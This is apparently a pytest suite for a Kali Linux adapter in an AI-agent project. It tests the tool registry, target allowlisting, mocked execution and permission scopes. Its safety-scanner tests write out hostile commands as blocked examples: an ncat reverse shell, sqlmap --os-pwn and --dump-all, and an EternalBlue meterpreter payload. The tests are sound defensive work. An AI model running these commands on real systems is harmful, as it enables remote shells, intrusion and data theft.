"""
tests/test_kali_adapter.py — Kali Linux Adapter Test Suite
============================================================
Covers:
  • Tool registry integrity (all 25 tools present, tiers correct)
  • Target scope validation (allowlist, pre-authorized, CIDR)
  • Command building (WSL command structure)
  • Output truncation (1 MB cap)
  • Execution mocking (success, failure, timeout)
  • Safety scanner integration (KALI_UNSAFE patterns)
  • Parallel execution
  • Permission scope resolution
"""
from __future__ import annotations

import json
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Ensure project root is on path
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from tools.kali_adapter import (
    KaliAdapter,
    KaliTier,
    KaliToolMeta,
    KALI_TOOL_REGISTRY,
    TargetScopeValidator,
    _extract_targets,
    _truncate_output,
    kali_tool,
    MAX_OUTPUT_BYTES,
)
from agent.models import PermissionScope
from agent.safety import ThreatCategory, ContentSafetyScanner


# ─── Tool Registry Tests ─────────────────────────────────────────────────────

class TestToolRegistry:
    """Validate the Kali tool registry has correct structure."""

    def test_registry_has_expected_tools(self):
        expected = {
            "nmap_discovery", "whois", "searchsploit", "subfinder",
            "amass_enum", "whatweb", "dnsrecon",
            "nikto", "gobuster", "ffuf", "nuclei", "wpscan",
            "nmap_vuln", "masscan", "dirb", "enum4linux",
            "hydra", "john", "hashcat", "sqlmap",
            "msfconsole", "evil_winrm", "crackmapexec", "responder",
        }
        assert expected.issubset(set(KALI_TOOL_REGISTRY.keys()))

    def test_all_tools_have_valid_tier(self):
        for name, meta in KALI_TOOL_REGISTRY.items():
            assert isinstance(meta.tier, KaliTier), f"{name} has invalid tier"

    def test_all_tools_have_scopes(self):
        for name, meta in KALI_TOOL_REGISTRY.items():
            assert len(meta.scopes) > 0, f"{name} has no scopes"

    def test_tier_1_tools_are_recon(self):
        tier1 = [m for m in KALI_TOOL_REGISTRY.values() if m.tier == KaliTier.TIER_1]
        for meta in tier1:
            assert PermissionScope.CAN_RECON in meta.scopes, f"{meta.name} missing CAN_RECON"

    def test_tier_3_tools_require_exploit_or_bruteforce(self):
        tier3 = [m for m in KALI_TOOL_REGISTRY.values() if m.tier == KaliTier.TIER_3]
        for meta in tier3:
            has_scope = (
                PermissionScope.CAN_EXPLOIT in meta.scopes
                or PermissionScope.CAN_BRUTEFORCE in meta.scopes
            )
            assert has_scope, f"{meta.name} missing CAN_EXPLOIT or CAN_BRUTEFORCE"

    def test_all_tools_have_binary(self):
        for name, meta in KALI_TOOL_REGISTRY.items():
            assert meta.binary, f"{name} has no binary specified"

    def test_all_tools_have_description(self):
        for name, meta in KALI_TOOL_REGISTRY.items():
            assert meta.description, f"{name} has no description"

    def test_all_timeouts_positive(self):
        for name, meta in KALI_TOOL_REGISTRY.items():
            assert meta.default_timeout > 0, f"{name} has non-positive timeout"


# ─── Target Scope Validator Tests ─────────────────────────────────────────────

class TestTargetScopeValidator:
    """Validate target allowlist enforcement."""

    @pytest.fixture
    def tmp_targets(self, tmp_path):
        """Create a temp targets file."""
        f = tmp_path / "kali_targets.json"
        data = {
            "allowed_targets": ["10.0.0.1", "example.com", "192.168.1.0/24"],
        }
        f.write_text(json.dumps(data))
        return f

    def test_pre_authorized_localhost(self, tmp_path):
        v = TargetScopeValidator(tmp_path / "targets.json")
        assert v.is_authorized("localhost")
        assert v.is_authorized("127.0.0.1")
        assert v.is_authorized("::1")

    def test_explicit_allowlist(self, tmp_targets):
        v = TargetScopeValidator(tmp_targets)
        assert v.is_authorized("10.0.0.1")
        assert v.is_authorized("example.com")

    def test_unauthorized_target(self, tmp_targets):
        v = TargetScopeValidator(tmp_targets)
        assert not v.is_authorized("evil.com")
        assert not v.is_authorized("8.8.8.8")

    def test_add_target(self, tmp_targets):
        v = TargetScopeValidator(tmp_targets)
        assert not v.is_authorized("newhost.com")
        v.add_target("newhost.com")
        assert v.is_authorized("newhost.com")
        # Persisted to disk
        data = json.loads(tmp_targets.read_text())
        assert "newhost.com" in data["allowed_targets"]

    def test_remove_target(self, tmp_targets):
        v = TargetScopeValidator(tmp_targets)
        assert v.is_authorized("10.0.0.1")
        v.remove_target("10.0.0.1")
        assert not v.is_authorized("10.0.0.1")

    def test_creates_default_config(self, tmp_path):
        f = tmp_path / "new_targets.json"
        assert not f.exists()
        v = TargetScopeValidator(f)
        assert f.exists()
        data = json.loads(f.read_text())
        assert "127.0.0.1" in data["allowed_targets"]
        assert "localhost" in data["allowed_targets"]

    def test_reload(self, tmp_targets):
        v = TargetScopeValidator(tmp_targets)
        # Externally modify the file
        data = json.loads(tmp_targets.read_text())
        data["allowed_targets"].append("reloaded.com")
        tmp_targets.write_text(json.dumps(data))
        # Before reload
        assert not v.is_authorized("reloaded.com")
        v.reload()
        assert v.is_authorized("reloaded.com")


# ─── Target Extraction Tests ─────────────────────────────────────────────────

class TestTargetExtraction:
    def test_extract_ip(self):
        targets = _extract_targets("-sV 192.168.1.1 -p 80")
        assert "192.168.1.1" in targets

    def test_extract_cidr(self):
        targets = _extract_targets("--top-ports 100 10.0.0.0/24")
        assert "10.0.0.0/24" in targets

    def test_extract_domain(self):
        targets = _extract_targets("-h example.com --threads 10")
        assert "example.com" in targets

    def test_no_targets(self):
        targets = _extract_targets("--help --version")
        assert len(targets) == 0


# ─── Output Truncation Tests ─────────────────────────────────────────────────

class TestOutputTruncation:
    def test_short_output_unchanged(self):
        text = "hello world"
        assert _truncate_output(text) == text

    def test_output_capped_at_1mb(self):
        text = "A" * (MAX_OUTPUT_BYTES + 10000)
        result = _truncate_output(text)
        assert len(result.encode("utf-8")) <= MAX_OUTPUT_BYTES + 200  # +notice
        assert "[OUTPUT TRUNCATED" in result

    def test_exact_boundary(self):
        text = "B" * MAX_OUTPUT_BYTES
        assert _truncate_output(text) == text


# ─── KaliAdapter Tests ───────────────────────────────────────────────────────

class TestKaliAdapter:
    @pytest.fixture
    def adapter(self, tmp_path):
        targets = tmp_path / "targets.json"
        data = {"allowed_targets": ["127.0.0.1", "localhost", "10.0.0.1"]}
        targets.write_text(json.dumps(data))
        return KaliAdapter(targets_file=targets)

    def test_get_tool_meta(self, adapter):
        meta = adapter.get_tool_meta("nmap_discovery")
        assert meta is not None
        assert meta.binary == "nmap"
        assert meta.tier == KaliTier.TIER_1

    def test_unknown_tool_returns_none(self, adapter):
        assert adapter.get_tool_meta("nonexistent_tool") is None

    def test_get_required_scopes(self, adapter):
        scopes = adapter.get_required_scopes("hydra")
        assert PermissionScope.CAN_BRUTEFORCE in scopes

    def test_validate_targets_authorized(self, adapter):
        valid, unauthorized = adapter.validate_targets("-sV 127.0.0.1 -p 80")
        assert valid
        assert len(unauthorized) == 0

    def test_validate_targets_unauthorized(self, adapter):
        valid, unauthorized = adapter.validate_targets("-sV evil.com -p 80")
        assert not valid
        assert "evil.com" in unauthorized

    def test_execute_unknown_tool(self, adapter):
        result = adapter.execute("fake_tool", "args")
        assert result.status == "error"
        assert "Unknown Kali tool" in result.summary

    def test_execute_unauthorized_target(self, adapter):
        result = adapter.execute("nmap_discovery", "-sV evil.com")
        assert result.status == "failure"
        assert "scope violation" in result.summary

    @patch("subprocess.run")
    def test_execute_success(self, mock_run, adapter):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="PORT   STATE SERVICE\n80/tcp open  http\n",
            stderr="",
        )
        result = adapter.execute("nmap_discovery", "-sV 127.0.0.1")
        assert result.status == "success"
        assert "completed" in result.summary
        assert result.observations["exit_code"] == 0

    @patch("subprocess.run")
    def test_execute_failure(self, mock_run, adapter):
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="nmap: error",
        )
        result = adapter.execute("nmap_discovery", "-sV 127.0.0.1")
        assert result.status == "failure"
        assert result.observations["exit_code"] == 1

    @patch("subprocess.run")
    def test_execute_timeout(self, mock_run, adapter):
        import subprocess as sp
        mock_run.side_effect = sp.TimeoutExpired(cmd="nmap", timeout=10)
        result = adapter.execute("nmap_discovery", "-sV 127.0.0.1", timeout=10)
        assert result.status == "error"
        assert "timed out" in result.summary

    @patch("subprocess.run")
    def test_execute_wsl_not_found(self, mock_run, adapter):
        mock_run.side_effect = FileNotFoundError("wsl not found")
        result = adapter.execute("nmap_discovery", "-sV 127.0.0.1")
        assert result.status == "error"
        assert "WSL" in result.summary

    def test_build_wsl_command(self, adapter):
        cmd = adapter._build_wsl_command("nmap", "-sV 127.0.0.1")
        assert cmd[0] == "wsl"
        assert "-d" in cmd
        assert "kali-linux" in cmd
        assert "nmap -sV 127.0.0.1" in cmd[-1]

    def test_list_available_tools(self, adapter):
        tools = adapter.list_available_tools()
        assert "tier_1" in tools
        assert "tier_2" in tools
        assert "tier_3" in tools
        assert len(tools["tier_1"]) > 0

    @patch("subprocess.run")
    def test_parallel_execution(self, mock_run, adapter):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="result",
            stderr="",
        )
        commands = [
            ("nmap_discovery", "-sV 127.0.0.1"),
            ("whatweb", "127.0.0.1"),
        ]
        results = adapter.execute_parallel(commands)
        assert len(results) == 2
        assert all(r.status == "success" for r in results)


# ─── Safety Scanner Integration Tests ────────────────────────────────────────

class TestKaliSafetyPatterns:
    """Verify that Kali-specific dangerous patterns are caught by the safety scanner."""

    @pytest.fixture
    def scanner(self):
        return ContentSafetyScanner()

    def test_wildcard_scan_blocked(self, scanner):
        result = scanner.scan("nmap -sV 0.0.0.0/0")
        assert not result.safe
        signals = [s for s in result.signals if s.category == ThreatCategory.KALI_UNSAFE]
        assert len(signals) > 0

    def test_sqlmap_os_pwn_blocked(self, scanner):
        result = scanner.scan("sqlmap -u http://target --os-pwn")
        assert not result.safe

    def test_meterpreter_blocked(self, scanner):
        result = scanner.scan("use exploit/windows/smb/ms17_010_eternalblue; set payload windows/meterpreter/reverse_tcp")
        assert not result.safe

    def test_reverse_shell_flag_blocked(self, scanner):
        result = scanner.scan("ncat -e bash 10.0.0.1 4444")
        assert not result.safe

    def test_batch_dump_all_blocked(self, scanner):
        result = scanner.scan("sqlmap -u http://target --batch --dump-all")
        assert not result.safe

    def test_normal_nmap_safe(self, scanner):
        result = scanner.scan("nmap -sV -p 80,443 127.0.0.1")
        # May have other signals but shouldn't have KALI_UNSAFE
        kali_signals = [s for s in result.signals if s.category == ThreatCategory.KALI_UNSAFE]
        assert len(kali_signals) == 0


# ─── Executor Integration Tests ──────────────────────────────────────────────

class TestKaliToolEntryPoint:
    """Test the kali_tool() function used by the executor registry."""

    @patch("subprocess.run")
    def test_kali_tool_success(self, mock_run):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="80/tcp open http",
            stderr="",
        )
        # Need a temp targets file with localhost
        with tempfile.TemporaryDirectory() as tmpdir:
            targets = Path(tmpdir) / "targets.json"
            targets.write_text(json.dumps({"allowed_targets": ["127.0.0.1"]}))
            with patch("tools.kali_adapter.TARGETS_FILE", targets):
                result = kali_tool(parameters={
                    "tool": "nmap_discovery",
                    "args": "-sV 127.0.0.1",
                })
        assert "[success]" in result

    def test_kali_tool_unknown(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            targets = Path(tmpdir) / "targets.json"
            targets.write_text(json.dumps({"allowed_targets": ["127.0.0.1"]}))
            with patch("tools.kali_adapter.TARGETS_FILE", targets):
                result = kali_tool(parameters={"tool": "fake", "args": ""})
        assert "[error]" in result


# ─── Permission Scope Tests ──────────────────────────────────────────────────

class TestKaliPermissionScopes:
    """Verify Kali scopes are in DANGEROUS_SCOPES."""

    def test_kali_scopes_are_dangerous(self):
        from agent.models import DANGEROUS_SCOPES
        assert PermissionScope.CAN_RECON in DANGEROUS_SCOPES
        assert PermissionScope.CAN_VULN_SCAN in DANGEROUS_SCOPES
        assert PermissionScope.CAN_BRUTEFORCE in DANGEROUS_SCOPES
        assert PermissionScope.CAN_EXPLOIT in DANGEROUS_SCOPES

    def test_kali_tool_in_policy_scope_map(self):
        from agent.policy import TOOL_SCOPE_MAP
        assert "kali_tool" in TOOL_SCOPE_MAP
        assert PermissionScope.CAN_EXECUTE_SHELL in TOOL_SCOPE_MAP["kali_tool"]
